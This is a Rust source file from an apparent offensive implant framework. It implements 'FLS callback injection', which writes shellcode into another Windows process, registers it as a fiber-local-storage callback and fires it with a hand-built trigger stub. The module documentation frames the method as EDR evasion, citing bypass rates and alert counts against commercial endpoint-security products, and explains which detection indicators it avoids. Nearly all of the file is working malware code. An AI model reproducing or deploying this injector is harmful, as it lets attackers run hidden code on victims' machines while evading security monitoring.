//! FLS callback injection — `inject` method 3 (WP-A, 2026-08-21).
//!
//! ## Why FLS callbacks (AutoBypass Table 11 evidence)
//! docs/research/frontier_gap_analysis_2026-08-21.md §1.1: across 7 commercial
//! EDR platforms, `fls_callback` scored a **60.0% bypass rate with only 14
//! alerts** — the best stealth/success trade-off in the matrix Nyx was missing
//! (threadless: 56.5% / **56** alerts; module_overload: 74.3% / 9). The win
//! over threadless is that NO existing thread is suspended or context-
//! hijacked: execution arrives via a thread-exit FLS rundown, a path most
//! EDRs do not instrument.
//!
//! ## Technique (cross-process form)
//! Every FLS index registered with `FlsAlloc` carries a
//! `PFLS_CALLBACK_FUNCTION` the OS invokes when a thread holding a non-NULL
//! value at that index exits (documented behavior: MSDN
//! `PFLS_CALLBACK_FUNCTION` — "called on fiber deletion, thread exit, and when
//! an FLS index is freed"). The rundown is **data-gated**: the callback fires
//! only when the exiting thread's FLS slot is non-NULL (ReactOS
//! kernel32!`BaseRundownFls`: `if (lpCallback && pFlsData->Data[n])
//! lpCallback(pFlsData->Data[n])`).
//!
//! Flow ([`fls_callback_inject`]):
//! 1. `VirtualAllocEx` RW → `WriteProcessMemory` shellcode → `VirtualProtectEx`
//!    RX. RWX is never used — a private RWX region is the loudest allocation
//!    IOC; the payload lives in private RX (the inject.rs "RX→RW→RX restore"
//!    discipline, applied to a fresh region).
//! 2. Register the shellcode as an FLS callback **inside the target**:
//!    `CreateRemoteThread(FlsAlloc, shellcode)`. kernel32 is mapped at a
//!    system-wide base, so the PEB-walked `FlsAlloc` address is valid
//!    remotely, and the target's OWN ntdll performs the version-specific
//!    bookkeeping (array allocation, bitmap, high-index). The thread exit code
//!    is the allocated FLS index.
//! 3. Write a 36-byte trigger stub next to the shellcode
//!    ([`build_trigger_stub`]): `FlsSetValue(index, shellcode)` then `ret`.
//! 4. `CreateRemoteThread(stub)`: the stub thread sets its FLS value and
//!    returns; `RtlExitUserThread`'s FLS rundown sees the non-NULL slot and
//!    calls `callback[index](value)` = the shellcode, with rcx = the
//!    shellcode's own address.
//!
//! ## Why NOT the classic PEB.FlsCallback swap
//! The textbook form (read `PEB.FlsCallback`, copy the callback array, append
//! an entry pointing at the shellcode, write the pointer back) only works up
//! to Windows 10 **1809**: the field was removed in 1903. Vergilius Project
//! `_PEB` x64 per-version dumps: 1507/1511/1607/1709/1809 have
//! `FlsCallback @ 0x320` / `FlsHighIndex @ 0x350`; 1903+ (verified 1903, 2004,
//! 22H2) replaces them with `SparePointers` — FLS bookkeeping moved to an
//! ntdll-internal structure with no stable cross-process anchor. The offsets
//! are pinned as constants below for the record (and unit-tested); the live
//! path deliberately registers via remote `FlsAlloc`, which is
//! version-agnostic BECAUSE the target's ntdll does the bookkeeping.
//!
//! ## Known environment limit: x64-on-ARM64 emulation (Prism)
//! Verified 2026-08-22, Win11 ARM64 (Parallels VM, SYSTEM), probe
//! `nyx_selftest_crt_probe2` (fresh target per control):
//! - `kernel32!CreateRemoteThread` → `GetLastError` = 6 (ERROR_INVALID_HANDLE)
//!   for ANY start address (private RX and system-DLL export alike) and ANY
//!   handle mask (0x002A and PROCESS_ALL_ACCESS alike), while VirtualAllocEx /
//!   WriteProcessMemory / VirtualProtectEx on the same handle succeed.
//! - `ntdll!NtCreateThreadEx` / `RtlCreateUserThread` DO create the thread
//!   object, but the thread starts as NATIVE ARM64 at the x64 start address:
//!   private RX start exits 0xC000001D (STATUS_ILLEGAL_INSTRUCTION — x64 bytes
//!   decoded as ARM64), image-export start exits 0xC0000005. The unhandled
//!   exception then TERMINATES the target process — actively harmful, so this
//!   "fallback" is deliberately NOT used.
//! - `NtCreateThreadEx` + `PS_ATTRIBUTE_LIST[MachineType=AMD64]`
//!   (PsAttributeMachineType=28|PS_ATTRIBUTE_INPUT) → 0xC000000D
//!   (STATUS_INVALID_PARAMETER) — not accepted for thread creation here.
//! Cross-process thread creation from an x64-emulated process is therefore
//! unusable under Prism, so [`fls_callback_inject`] refuses up front. This
//! also explains the method-2 (`inject_existing`) and module-stomp cover-DLL
//! load failures in the same VM — both die at `CreateRemoteThread`.
//!
//! ## Detection honesty — what it DOES and DOES NOT evade
//! - **No unbacked RWX**: the payload region is private RX. Moneta deep-scan
//!   may still flag "private executable", but the RWX IOC is absent.
//! - **Two `CreateRemoteThread` calls**: the classic remote-thread IOC IS
//!   present (unlike Pool Party's worker-factory splice). What is absent vs.
//!   threadless: no `NtSuspendThread` / `NtGet|SetContextThread` on a foreign
//!   thread — the thread-context IOC chain that drives threadless's 56 alerts.
//! - **The FLS registration itself** (a callback pointer into private RX
//!   memory) is the technique's novel signal: an EDR auditing FLS callback
//!   tables for non-image pointers catches this. AutoBypass's 14-alert
//!   measurement says most of the 7 evaluated platforms do not.
//!
//! ## Zero-leftover contract
//! On every non-success path the remote region is `VirtualFreeEx`-released
//! ([`RemoteAlloc`] Drop guard) and every thread handle is closed. On success
//! the region is intentionally KEPT — the shellcode is executing from it
//! (freeing would crash the target mid-payload; the `inject_existing`
//! precedent), and the payload lives until the host thread exits.

#![cfg(target_os = "windows")]

use core::ffi::c_void;
use core::sync::atomic::{AtomicBool, Ordering};
use nyx_implant_core::resolve::export_addr;

/// x64 PEB offsets for the CLASSIC PEB-swap form of this technique. Valid
/// Windows 10 1507–1809 only; the fields were removed in 1903 (see module
/// docs). Source: Vergilius Project `_PEB` x64 dumps (windows-10 1507, 1511,
/// 1607, 1709, 1809). Not used by the live path — pinned for reference and
/// regression-tested so the documented values cannot silently drift.
pub const PEB_FLS_CALLBACK_OFFSET: usize = 0x320;
/// `PEB.FlsHighIndex` (x64), same provenance/validity as
/// [`PEB_FLS_CALLBACK_OFFSET`].
pub const PEB_FLS_HIGH_INDEX_OFFSET: usize = 0x350;

/// `FlsAlloc` failure sentinel (`FLS_OUT_OF_INDEXES`).
const FLS_OUT_OF_INDEXES: u32 = 0xFFFF_FFFF;

/// `IMAGE_FILE_MACHINE_AMD64` — IsWow64Process2's ProcessMachine for an
/// x64-emulated process under Prism.
const IMAGE_FILE_MACHINE_AMD64: u16 = 0x8664;

/// Is the process behind `h` an x64-emulated (Prism) process? Used to scope
/// the x64-on-ARM64 up-front refusal to CROSS-ARCH targets: Prism breaks
/// x64→native-ARM64 remote-thread creation, but x64→x64 within the emulation
/// is the crt_probe3-verified working case. Conservative: any resolution
/// failure answers false (keep the refusal).
unsafe fn target_is_x64_emulated(h: *mut c_void) -> bool {
    type IsWow64Process2 = unsafe extern "system" fn(*mut c_void, *mut u16, *mut u16) -> i32;
    let mut ok = 0i32;
    let mut process_machine: u16 = 0;
    let mut native_machine: u16 = 0;
    // kernel32!IsWow64Process2 is a forwarder to kernelbase on modern
    // Windows — try both (the is_x64_emulated_on_arm64 module loop).
    let mut resolved = false;
    for module in [b"kernel32.dll".as_slice(), b"kernelbase.dll".as_slice()] {
        if let Some(addr) = unsafe { export_addr(module, b"IsWow64Process2") } {
            resolved = true;
            let f: IsWow64Process2 = unsafe { core::mem::transmute(addr) };
            ok = unsafe { f(h, &mut process_machine, &mut native_machine) };
            if ok != 0 {
                break;
            }
        }
    }
    // `resolved` is consumed by the selftest marker below; keep it live on
    // non-selftest builds so `-D unused-variables` (CI standalone crate tests)
    // does not fail the library.
    let _ = resolved;
    // g6 diagnosis (selftest builds only): the refusal decision inputs — a
    // false here keeps the Prism refusal, so record WHY (unresolved API /
    // call failed / unexpected machine values).
    #[cfg(feature = "selftest")]
    {
        let mut s = nyx_implant_core::heap::String::from("resolved=");
        s.push_str(if resolved { "1" } else { "0" });
        s.push_str(" ok=");
        s.push_str(&crate::selftests::dec_u32(ok as u32));
        s.push_str(" pm=0x");
        s.push_str(&crate::selftests::hex_u32(process_machine as u32));
        s.push_str(" nm=0x");
        s.push_str(&crate::selftests::hex_u32(native_machine as u32));
        crate::selftests::write_marker("nyx_g6_fls.tgt_mach", &s);
    }
    ok != 0 && process_machine == IMAGE_FILE_MACHINE_AMD64
}

/// Highest valid FLS index (`FLS_MAXIMUM_AVAILABLE` - 1). Index 0 is
/// reserved (the FLS bitmap starts allocations at bit 1); anything above 127
/// — including `STILL_ACTIVE` (259) read from a hung thread — is bogus.
const FLS_MAX_INDEX: u32 = 127;

/// Length of [`build_trigger_stub`]'s output; see the encoding there.
const TRIGGER_STUB_LEN: usize = 36;

/// Master switch for FLS callback injection. **Defaults ON** — aligned with
/// the module-stomp gate (inject.rs `MODULESTOMP_ENABLED`); the data path and
/// the execution path are the same cross-process primitives the other armed
/// methods already use.
static FLS_INJECT_ENABLED: AtomicBool = AtomicBool::new(true);

/// Arm/disarm FLS callback injection. Returns the previous value.
pub fn set_fls_inject_enabled(on: bool) -> bool {
    FLS_INJECT_ENABLED.swap(on, Ordering::Release)
}

/// Whether FLS callback injection is currently armed.
pub fn fls_inject_enabled() -> bool {
    FLS_INJECT_ENABLED.load(Ordering::Acquire)
}

// ---- remote helpers (resolved via PEB walk) ----

type VirtualAllocEx = unsafe extern "system" fn(
    *mut c_void,   // hProcess
    *const c_void, // lpAddress (null = anywhere)
    usize,         // dwSize
    u32,           // flAllocationType
    u32,           // flProtect
) -> *mut c_void;
type VirtualProtectEx =
    unsafe extern "system" fn(*mut c_void, *const c_void, usize, u32, *mut u32) -> i32;
type WriteProcessMemory =
    unsafe extern "system" fn(*mut c_void, *mut c_void, *const u8, usize, *mut usize) -> i32;
type CreateRemoteThread = unsafe extern "system" fn(
    *mut c_void,
    *mut c_void,
    usize,
    Option<unsafe extern "system" fn(*mut c_void) -> u32>,
    *mut c_void,
    u32,
    *mut c_void,
) -> *mut c_void;
type WaitForSingleObject = unsafe extern "system" fn(*mut c_void, u32) -> u32;
type GetExitCodeThread = unsafe extern "system" fn(*mut c_void, *mut u32) -> i32;
type CloseHandle = unsafe extern "system" fn(*mut c_void) -> i32;
/// `CreateRemoteThread` start-routine ABI (rcx = lpParameter).
type ThreadProc = unsafe extern "system" fn(*mut c_void) -> u32;

/// The kernel32 exports resolved once per inject.
struct FlsFns {
    vax: VirtualAllocEx,
    vpx: VirtualProtectEx,
    wpm: WriteProcessMemory,
    crt: CreateRemoteThread,
    wait: WaitForSingleObject,
    get_exit: GetExitCodeThread,
    close: CloseHandle,
    fls_alloc: usize,
    fls_set_value: usize,
}

/// Resolve + transmute the kernel32 exports the FLS path needs. `FlsAlloc` /
/// `FlsSetValue` are kept as raw addresses: they are START ADDRESSES for
/// remote threads / the stub in the TARGET, not calls we make — kernel32's
/// system-wide base makes our PEB-walked addresses valid remotely.
unsafe fn fls_resolve() -> Result<FlsFns, &'static str> {
    let vax: VirtualAllocEx = core::mem::transmute(
        export_addr(b"kernel32.dll", b"VirtualAllocEx").ok_or("VirtualAllocEx")?,
    );
    let vpx: VirtualProtectEx = core::mem::transmute(
        export_addr(b"kernel32.dll", b"VirtualProtectEx").ok_or("VirtualProtectEx")?,
    );
    let wpm: WriteProcessMemory = core::mem::transmute(
        export_addr(b"kernel32.dll", b"WriteProcessMemory").ok_or("WriteProcessMemory")?,
    );
    let crt: CreateRemoteThread = core::mem::transmute(
        export_addr(b"kernel32.dll", b"CreateRemoteThread").ok_or("CreateRemoteThread")?,
    );
    let wait: WaitForSingleObject = core::mem::transmute(
        export_addr(b"kernel32.dll", b"WaitForSingleObject").ok_or("WaitForSingleObject")?,
    );
    let get_exit: GetExitCodeThread = core::mem::transmute(
        export_addr(b"kernel32.dll", b"GetExitCodeThread").ok_or("GetExitCodeThread")?,
    );
    let close: CloseHandle =
        core::mem::transmute(export_addr(b"kernel32.dll", b"CloseHandle").ok_or("CloseHandle")?);
    let fls_alloc = export_addr(b"kernel32.dll", b"FlsAlloc").ok_or("FlsAlloc")?;
    let fls_set_value = export_addr(b"kernel32.dll", b"FlsSetValue").ok_or("FlsSetValue")?;
    Ok(FlsFns {
        vax,
        vpx,
        wpm,
        crt,
        wait,
        get_exit,
        close,
        fls_alloc,
        fls_set_value,
    })
}

/// Drop-guarded remote allocation (zero-leftover contract): frees the region
/// with `VirtualFreeEx(MEM_RELEASE)` on drop unless [`RemoteAlloc::keep`] was
/// called. On success the shellcode is executing from the region, so freeing
/// it would crash the target mid-payload — `keep` is the success hand-off
/// (the `inject_existing` precedent, which also leaves its region behind).
struct RemoteAlloc {
    h: *mut c_void,
    base: *mut c_void,
    keep: bool,
}

impl RemoteAlloc {
    /// Disarm the guard: the region now belongs to the running payload.
    fn keep(&mut self) {
        self.keep = true;
    }
}

impl Drop for RemoteAlloc {
    fn drop(&mut self) {
        // SAFETY: single-threaded beacon context; best-effort cleanup. The
        // crate builds with panic=abort, so Drop never runs during unwinding,
        // and nothing here allocates — this cannot fault.
        if self.keep || self.base.is_null() {
            return;
        }
        unsafe {
            if let Some(addr) = export_addr(b"kernel32.dll", b"VirtualFreeEx") {
                let vfx: unsafe extern "system" fn(*mut c_void, *mut c_void, usize, u32) -> i32 =
                    core::mem::transmute(addr);
                let _ = vfx(self.h, self.base, 0, 0x8000 /* MEM_RELEASE */);
            }
        }
    }
}

/// Inject `shellcode` into the process behind `proc_handle` via the FLS
/// callback table. See the module docs for the technique and the detection
/// analysis. The caller owns `proc_handle` (needs PROCESS_CREATE_THREAD |
/// PROCESS_VM_OPERATION | PROCESS_VM_WRITE) and closes it.
///
/// # Safety
/// Cross-process handle + memory + remote-thread operations. Single-threaded
/// beacon context.
pub unsafe fn fls_callback_inject(
    proc_handle: *mut c_void,
    shellcode: &[u8],
) -> Result<(), &'static str> {
    if !fls_inject_enabled() {
        return Err("fls callback inject disabled (gate off)");
    }
    if shellcode.is_empty() {
        return Err("empty shellcode");
    }
    // Honest environment limit (see module docs "Known environment limit"):
    // under x64-on-ARM64 emulation, CROSS-ARCH remote-thread creation is
    // unusable — kernel32!CreateRemoteThread into a native-ARM64 target fails
    // with ERROR_INVALID_HANDLE, and a direct NtCreateThreadEx thread starts
    // NATIVE ARM64 at the x64 start address, crashes, and takes the TARGET
    // down with the unhandled exception. Refuse up front instead of bricking
    // the target — but only when the target is NOT a peer x64-emulated
    // process: Prism translates remote-thread creation within the emulation
    // (2026-08-24, nyx_selftest_crt_probe3), so an x64 target remains
    // injectable here.
    if nyx_implant_core::syscalls::is_x64_emulated_on_arm64()
        && !unsafe { target_is_x64_emulated(proc_handle) }
    {
        return Err(
            "fls callback inject unsupported: x64-on-ARM64 emulation (Prism) — \
             remote-thread creation broken (CreateRemoteThread GLE=6; direct \
             NtCreateThreadEx thread starts native ARM64 and crashes the target)",
        );
    }
    let fns = unsafe { fls_resolve()? };

    // Step 1: remote region (shellcode + trigger stub), committed RW — flipped
    // to RX in step 4, before any remote execution touches it.
    let region_len = shellcode.len() + TRIGGER_STUB_LEN;
    let base = unsafe {
        (fns.vax)(
            proc_handle,
            core::ptr::null(),
            region_len,
            0x3000, /* MEM_COMMIT | MEM_RESERVE */
            0x04,   /* PAGE_READWRITE */
        )
    };
    if base.is_null() {
        #[cfg(feature = "selftest")]
        diag_gle("nyx_g6_fls.vax.gle");
        return Err("VirtualAllocEx (payload)");
    }
    // From here on, every failure path frees the region via this guard.
    let mut alloc = RemoteAlloc {
        h: proc_handle,
        base,
        keep: false,
    };
    unsafe { remote_write(&fns, proc_handle, base as usize, shellcode)? };

    // Step 2: register the shellcode as an FLS callback in the target.
    let index = unsafe { remote_fls_alloc(&fns, proc_handle, base as usize)? };

    // Step 3: the trigger stub, right after the shellcode in the same region.
    //    The FLS value is set to the shellcode's own address: non-NULL (the
    //    rundown's data gate) and useful (the callback's rcx = self).
    let stub = build_trigger_stub(index, base as u64, fns.fls_set_value as u64);
    unsafe { remote_write(&fns, proc_handle, base as usize + shellcode.len(), &stub)? };

    // Step 4: RW → RX (0x20 = PAGE_EXECUTE_READ). Checked — a silent failure
    //    would leave the payload RW|X, a louder IOC than plain RX (the
    //    stomp_and_resume restore-check precedent).
    let mut old: u32 = 0;
    if unsafe { (fns.vpx)(proc_handle, base as *const _, region_len, 0x20, &mut old) } == 0 {
        #[cfg(feature = "selftest")]
        diag_gle("nyx_g6_fls.vpx.gle");
        return Err("VirtualProtectEx RW→RX failed");
    }

    // Step 5: fire. The stub thread sets the FLS value and returns; the
    //    exit-time rundown invokes callback[index] = the shellcode.
    unsafe { remote_trigger(&fns, proc_handle, base as usize + shellcode.len())? };

    // Success: the region now belongs to the running payload.
    alloc.keep();
    Ok(())
}

/// Create a remote thread starting at `start` with parameter `param` via
/// kernel32!`CreateRemoteThread`. (The direct-`NtCreateThreadEx` variant was
/// tried and REMOVED 2026-08-22: under Prism it creates a thread that starts
/// as native ARM64 and crashes the target — see the module docs' "Known
/// environment limit" section. Native x64 needs nothing else.)
unsafe fn create_remote_thread(
    fns: &FlsFns,
    h: *mut c_void,
    start: usize,
    param: *mut c_void,
) -> *mut c_void {
    let start_proc: ThreadProc = unsafe { core::mem::transmute(start) };
    unsafe {
        (fns.crt)(
            h,
            core::ptr::null_mut(),
            0,
            Some(start_proc),
            param,
            0,
            core::ptr::null_mut(),
        )
    }
}

/// Step 2: `CreateRemoteThread(FlsAlloc, sc_addr)` — registers `sc_addr` as
/// the FLS callback for a fresh index IN THE TARGET. The thread exit code is
/// the allocated index (a DWORD; FLS indices never exceed 127, so nothing is
/// truncated — unlike the HMODULE-truncation problem remote_load_library
/// works around). The FlsAlloc thread itself exits with its slot NULL
/// (FlsAlloc clears the value), so its own rundown does NOT fire our
/// callback — only the step-5 stub thread's does.
unsafe fn remote_fls_alloc(
    fns: &FlsFns,
    h: *mut c_void,
    sc_addr: usize,
) -> Result<u32, &'static str> {
    let th = unsafe { create_remote_thread(fns, h, fns.fls_alloc, sc_addr as *mut c_void) };
    if th.is_null() {
        #[cfg(feature = "selftest")]
        diag_gle("nyx_g6_fls.crt_flsalloc.gle");
        return Err("CreateRemoteThread (FlsAlloc)");
    }
    let w = unsafe { (fns.wait)(th, 10_000) };
    let mut code: u32 = FLS_OUT_OF_INDEXES;
    let _ = unsafe { (fns.get_exit)(th, &mut code) };
    let _ = unsafe { (fns.close)(th) };
    // g6 diagnosis (selftest builds only): record the FlsAlloc thread's raw
    // exit code — a crashed registration thread surfaces here as an NTSTATUS,
    // indistinguishable from a bogus index without the value.
    #[cfg(feature = "selftest")]
    {
        let mut s = nyx_implant_core::heap::String::from("wait=");
        s.push_str(&crate::selftests::dec_u32(w));
        s.push_str(" code=0x");
        s.push_str(&crate::selftests::hex_u32(code));
        crate::selftests::write_marker("nyx_g6_fls.flsalloc.code", &s);
    }
    if w != 0 {
        // WAIT_OBJECT_0 is 0; anything else = the registration thread never
        // finished (timeout / wait failure) — the exit code is untrustworthy.
        return Err("FlsAlloc thread did not exit (10s)");
    }
    if code == FLS_OUT_OF_INDEXES {
        return Err("remote FlsAlloc failed (FLS_OUT_OF_INDEXES)");
    }
    if code == 0 || code > FLS_MAX_INDEX {
        return Err("remote FlsAlloc: implausible FLS index");
    }
    Ok(code)
}

/// Step 5: `CreateRemoteThread(stub)`. Waits for the stub thread to die —
/// when the wait returns signaled, the thread's exit-time rundown (and hence
/// the callback) has already run. The exit code is deliberately NOT checked:
/// a non-returning payload never reaches the point where the thread's exit
/// status is stored, so a non-1 code is not a failure signal.
unsafe fn remote_trigger(fns: &FlsFns, h: *mut c_void, start: usize) -> Result<(), &'static str> {
    let th = unsafe { create_remote_thread(fns, h, start, core::ptr::null_mut()) };
    if th.is_null() {
        #[cfg(feature = "selftest")]
        diag_gle("nyx_g6_fls.crt_trigger.gle");
        return Err("CreateRemoteThread (trigger)");
    }
    let w = unsafe { (fns.wait)(th, 10_000) };
    // g6 diagnosis (selftest builds only, 2026-08-24): record the trigger
    // thread's exit code. The stub returns FlsSetValue's BOOL in eax, so for
    // a RETURNING probe payload (the selftest's 0xC3) exit==1 ⟺ FlsSetValue
    // succeeded and the rundown fired the callback — this closes the "ok
    // false-positive" blind spot where remote_trigger returns Ok but the
    // stub never actually set the FLS value. Deliberately NOT checked (see
    // the fn docs): a non-returning payload never reaches the point where
    // the exit status is stored.
    #[cfg(feature = "selftest")]
    {
        let mut code: u32 = u32::MAX;
        let _ = unsafe { (fns.get_exit)(th, &mut code) };
        let mut s = nyx_implant_core::heap::String::from("wait=");
        s.push_str(&crate::selftests::dec_u32(w));
        s.push_str(" code=0x");
        s.push_str(&crate::selftests::hex_u32(code));
        crate::selftests::write_marker("nyx_g6_fls.trigger.code", &s);
    }
    let _ = unsafe { (fns.close)(th) };
    if w != 0 {
        return Err("trigger thread did not exit (10s)");
    }
    Ok(())
}

/// g6 diagnosis (2026-08-21, selftest builds ONLY): the `&'static str` error
/// contract cannot carry the OS error code, so a failed remote primitive
/// records its `GetLastError` (decimal) to a marker file. Production builds
/// compile this out entirely — no marker, no extra resolve.
#[cfg(feature = "selftest")]
fn diag_gle(marker: &str) {
    let Some(gle_addr) = (unsafe { export_addr(b"kernel32.dll", b"GetLastError") }) else {
        return;
    };
    let gle: unsafe extern "system" fn() -> u32 = unsafe { core::mem::transmute(gle_addr) };
    let mut code = unsafe { gle() };
    let mut buf = [0u8; 12]; // "gle=" + up to 10 digits + NUL-free
    buf[0] = b'g';
    buf[1] = b'l';
    buf[2] = b'e';
    buf[3] = b'=';
    let mut digits = [0u8; 10];
    let mut n = 0usize;
    if code == 0 {
        digits[0] = b'0';
        n = 1;
    } else {
        while code > 0 {
            digits[n] = b'0' + (code % 10) as u8;
            code /= 10;
            n += 1;
        }
    }
    let mut len = 4usize;
    while n > 0 {
        n -= 1;
        buf[len] = digits[n];
        len += 1;
    }
    crate::selftests::write_marker(marker, unsafe {
        core::str::from_utf8_unchecked(&buf[..len])
    });
}

/// Write exactly `data.len()` bytes into the target.
unsafe fn remote_write(
    fns: &FlsFns,
    h: *mut c_void,
    addr: usize,
    data: &[u8],
) -> Result<(), &'static str> {
    let mut written: usize = 0;
    if unsafe { (fns.wpm)(h, addr as *mut _, data.as_ptr(), data.len(), &mut written) } == 0 {
        #[cfg(feature = "selftest")]
        diag_gle("nyx_g6_fls.wpm.gle");
        Err("WriteProcessMemory")
    } else {
        Ok(())
    }
}

/// Build the 36-byte x64 trigger stub:
///
/// ```text
///   mov ecx, <fls_index>     ; B9 imm32        FlsSetValue arg 1
///   mov rdx, <data>          ; 48 BA imm64     FlsSetValue arg 2 (non-NULL)
///   sub rsp, 0x28            ; 48 83 EC 28     shadow space + 16-byte align
///   mov rax, <FlsSetValue>   ; 48 B8 imm64     (system-wide kernel32 address)
///   call rax                 ; FF D0
///   add rsp, 0x28            ; 48 83 C4 28
///   ret                      ; C3              → RtlExitUserThread → rundown
/// ```
///
/// Alignment: a thread start routine is entered with rsp % 16 == 8 (the
/// kernel "calls" it), so `sub rsp, 0x28` leaves rsp 16-aligned at the
/// `call` per the Win64 ABI. The final `ret` returns into the thread-exit
/// path, whose FLS rundown fires `callback[fls_index](data)`.
fn build_trigger_stub(fls_index: u32, data: u64, fls_set_value: u64) -> [u8; TRIGGER_STUB_LEN] {
    let mut s = [0u8; TRIGGER_STUB_LEN];
    s[0] = 0xB9; // mov ecx, imm32
    s[1..5].copy_from_slice(&fls_index.to_le_bytes());
    s[5] = 0x48; // mov rdx, imm64
    s[6] = 0xBA;
    s[7..15].copy_from_slice(&data.to_le_bytes());
    s[15] = 0x48; // sub rsp, 0x28
    s[16] = 0x83;
    s[17] = 0xEC;
    s[18] = 0x28;
    s[19] = 0x48; // mov rax, imm64
    s[20] = 0xB8;
    s[21..29].copy_from_slice(&fls_set_value.to_le_bytes());
    s[29] = 0xFF; // call rax
    s[30] = 0xD0;
    s[31] = 0x48; // add rsp, 0x28
    s[32] = 0x83;
    s[33] = 0xC4;
    s[34] = 0x28;
    s[35] = 0xC3; // ret
    s
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Gate defaults ON (aligned with module stomp) and round-trips.
    #[test]
    fn gate_defaults_on_and_round_trips() {
        assert!(fls_inject_enabled());
        let prev = set_fls_inject_enabled(false);
        assert!(!fls_inject_enabled());
        assert!(prev);
        set_fls_inject_enabled(prev);
        assert!(fls_inject_enabled());
    }

    /// Pin the legacy PEB offsets (Vergilius _PEB x64, Win10 1507–1809). They
    /// are load-bearing documentation for the classic swap form — a silent
    /// drift here means someone edited the cited values.
    #[test]
    fn peb_offsets_pinned() {
        assert_eq!(PEB_FLS_CALLBACK_OFFSET, 0x320);
        assert_eq!(PEB_FLS_HIGH_INDEX_OFFSET, 0x350);
    }

    /// The trigger stub must encode byte-for-byte: a wrong immediate or opcode
    /// crashes the target's trigger thread (and possibly the target) instead
    /// of firing the callback.
    #[test]
    fn stub_encoding_exact() {
        let stub = build_trigger_stub(0x11223344, 0x0102030405060708, 0xA1A2A3A4A5A6A7A8);
        let want: [u8; TRIGGER_STUB_LEN] = [
            0xB9, 0x44, 0x33, 0x22, 0x11, // mov ecx, 0x11223344
            0x48, 0xBA, 0x08, 0x07, 0x06, 0x05, 0x04, 0x03, 0x02,
            0x01, // mov rdx, 0x0102030405060708
            0x48, 0x83, 0xEC, 0x28, // sub rsp, 0x28
            0x48, 0xB8, 0xA8, 0xA7, 0xA6, 0xA5, 0xA4, 0xA3, 0xA2,
            0xA1, // mov rax, 0xA1A2A3A4A5A6A7A8
            0xFF, 0xD0, // call rax
            0x48, 0x83, 0xC4, 0x28, // add rsp, 0x28
            0xC3, // ret
        ];
        assert_eq!(stub, want);
    }

    /// The FLS index immediate lands at byte 1 (where remote patching / a
    /// debugger would look for it) and a zero index encodes correctly — index
    /// 0 can never reach the stub live (remote_fls_alloc rejects it), but the
    /// builder itself must not special-case it.
    #[test]
    fn stub_index_immediate_placement() {
        let stub = build_trigger_stub(0, 0, 0);
        assert_eq!(&stub[1..5], &[0, 0, 0, 0]);
        let stub = build_trigger_stub(0x7F, 0, 0); // FLS_MAX_INDEX
        assert_eq!(&stub[1..5], &[0x7F, 0, 0, 0]);
        assert_eq!(stub[35], 0xC3); // always ends in ret
    }
}
